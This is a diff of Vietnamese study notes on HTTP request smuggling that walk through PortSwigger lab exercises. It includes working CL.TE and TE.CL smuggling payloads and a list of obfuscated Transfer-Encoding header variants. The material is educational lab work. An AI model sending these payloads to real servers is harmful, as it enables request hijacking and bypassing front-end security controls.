@@ -53,11 +53,11 @@ Các cuộc tấn công request smuggling cổ điển liên quan đến việc 
 - `TE.CL`: máy chủ phía trước sử dụng header `Transfer-Encoding`, còn máy chủ phía sau sử dụng header `Content-Length`.
 - `TE.TE`: cả máy chủ phía trước và máy chủ phía sau đều hỗ trợ header `Transfer-Encoding`, nhưng một trong hai máy chủ có thể bị làm cho không xử lý header này nếu nó bị làm mờ theo cách nào đó.
 
-## how to detect
+## How to detect
 
+[detect](detect.md)
 
-
-### Lỗ hổng `CL.TE` 
+### Lỗ hổng CL.TE
 Trong trường hợp này, máy chủ phía trước sử dụng header `Content-Length`, còn máye chủ phía sau sử dụng hader `Transfer-Encoding`. Chúng ta có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:
 ```http
 POST / HTTP/1.1
@@ -79,8 +79,6 @@ https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
 
 Yêu cầu: đánh lừa máy chủ gửi 1 request `GPOST`
 
-PHẦN DETECT TA SẼ THẢO LUẬN SAU 
-
 Đổi về HTTP 1.1\
 ![alt text](image-2.png)
 
@@ -95,6 +93,94 @@ Bật chế độ xem các kí tự ngắt dòng để dễ hiểu hơn:\
 
 Ở đây `\n` hay `\r` tính là 1 byte nên `Content-length` được tính là 6 (do bỏ qua 1 dòng trắng) nhưng với máy chủ phân giải `Transfer-encoding` thì sẽ tính khối `0` đầu tiên là kết thúc, nên nó hiểu `G` của request sau, và gộp với `POST` thành `GPOST` và nó phản hồi là không hiểu `GPOST`:\
 ![alt text](image-6.png)
+
+---
+
+### Lỗ hổng TE.CL 
+Trong trường hợp này, máy chủ phía trước sử dụng header `Transfer-Encoding`, và máy chủ phía sau sử dụng header `Content-Length`.
+
+Gửi request:
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+```
+
+Lưu ý:  cần bao gồm chuỗi kết thúc `\r\n\r\n` sau ký tự `0` cuối cùng
+
+Máy chủ phía trước xử lý header `Transfer-Encoding` và coi phần thân của thông điệp là sử dụng mã hóa theo từng khối (chunked encoding). Nó xử lý khối đầu tiên có độ dài `8` byte, tính đến đầu dòng sau chữ `SMUGGLED`. Tiếp theo, nó xử lý khối thứ hai có độ dài là `0` byte, và coi đây là dấu hiệu kết thúc yêu cầu. Yêu cầu này sau đó được chuyển tiếp đến máy chủ phía sau.
+
+Máy chủ phía sau xử lý header `Content-Length` và xác định rằng phần thân của yêu cầu có độ dài 3 byte, đến đầu dòng sau `8`. Các byte sau đó, bắt đầu từ `SMUGGLED`, không được xử lý và máy chủ phía sau sẽ coi chúng là phần đầu của yêu cầu tiếp theo trong chuỗi.
+
+---
+
+### 2. HTTP request smuggling, basic TE.CL vulnerability
+https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
+
+Yêu cầu: đánh lừa back-end xử lí request GPOST
+
+Payload: 
+
+```http
+POST / HTTP/1.1
+Host: 0a9000ab0345a700823270680058003e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
+
+Chú ý đến `/r/n/r/n` sau `0`
+
+---
+
+### Hành vi TE.TE: làm nhiễu header TE
+Trong trường hợp này, cả máy chủ phía trước và phía sau đều hỗ trợ header `Transfer-Encoding`, nhưng có thể khiến một trong hai máy chủ không xử lý nó bằng cách làm nhiễu header này.
+
+Có nhiều cách khác nhau để làm nhiễu header Transfer-Encoding. Ví dụ:
+```http
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+Mỗi kỹ thuật trên đều có một sự thay đổi nhỏ so với đặc tả HTTP. Trong thực tế, mã thực hiện đặc tả giao thức hiếm khi tuân thủ tuyệt đối và các triển khai khác nhau thường sẽ chấp nhận các biến thể khác nhau so với đặc tả. Để tìm ra lỗ hổng TE.TE, cần phải xác định một biến thể của header Transfer-Encoding sao cho chỉ một trong hai máy chủ phía trước hoặc phía sau xử lý nó, trong khi máy chủ còn lại bỏ qua.
+
+Tùy thuộc vào việc máy chủ phía trước hay phía sau có thể bị làm cho không xử lý header Transfer-Encoding bị làm nhiễu, phần còn lại của cuộc tấn công sẽ giống với các lỗ hổng CL.TE hoặc TE.CL đã được mô tả trước đó.
+
+---
+
+### 3. HTTP request smuggling, obfuscating the TE header
+https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
+
+Mục tiêu: đánh lừa back-end request `GPOST`
+
+
 
 
 
